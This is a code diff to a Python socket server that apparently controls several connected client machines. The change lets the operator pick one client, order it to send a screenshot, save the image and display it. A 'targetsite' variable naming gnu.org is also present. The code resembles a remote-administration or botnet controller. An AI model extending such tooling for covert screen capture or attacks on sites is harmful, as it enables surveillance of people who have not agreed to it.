@@ -1,8 +1,9 @@
 import socket
-import pyautogui
+from PIL import Image, ImageTk
 import keyboard
 from time import sleep
-from ShellUi import Line,newLine,window
+from ShellUi import Simage,Line,newLine,window
+from io import BytesIO
 text = ""
 numclients = 1
 
@@ -68,28 +69,66 @@ def connect():
             connected[p][3] = data.decode() == "yes"
             Line(hn+" connection status: "+str(connected[p][3]),True)
 
-# Screenshot
+# asks all connected clients to take a screenshot and send it back
+savedimgs = []
 def Screenshot():
-    images = []
-    for cl,_,_,_ in connected:
-        cl.send(str("3").encode())
-    for cl,_,hn,_ in connected:
-        images.append(b'')
-        while True:
-            data = cl.recv(1024)
-            if not data:
-                break
+    image = b''
+    clidata = None
+    text = ""
 
+    for i in range(len(connected)):
+            Line(str(i)+". "+connected[i][2],True)
+    while True:
+        Line("Answer: "+text)
+        key = keyboard.read_key()
+
+        if key == 'enter':
+            newLine()
             try:
-                data = data.decode()
+                num = int(text)
+                if num > -1 and num < len(connected):
+                    clidata = connected[num]
+                    break
             except Exception as e:
-                images[len(images)-1] += data
-                continue
+                pass
+            text = ""
+            Line("Not a option",True)
+            for i in range(len(connected)):
+                Line(str(i)+". "+connected[i][2],True)
+        elif key in ["shift","ctrl","alt"]:
+            continue
 
-            if data == "end":
-                break
+        elif key == "backspace":
+            text = text[0:len(text)-1]
 
-    print(images)
+        elif key == "space":
+            text += " "
+
+        elif key != "":
+            text += key
+
+        sleep(.115)
+
+    clidata[0].send("3".encode())
+    while True:
+        data = clidata[0].recv(99999)
+        if not data:
+            break
+
+        try:
+            data = data.decode()
+        except Exception as e:
+            image += data
+            continue
+
+        if data == "end":
+            break
+    
+    with open("screen.png","wb") as img:
+        img.write(image)
+    img = ImageTk.PhotoImage(Image.open("screen.png"))
+    savedimgs.append(img)
+    Simage(img)
 
 targetsite = "gnu.org"
 
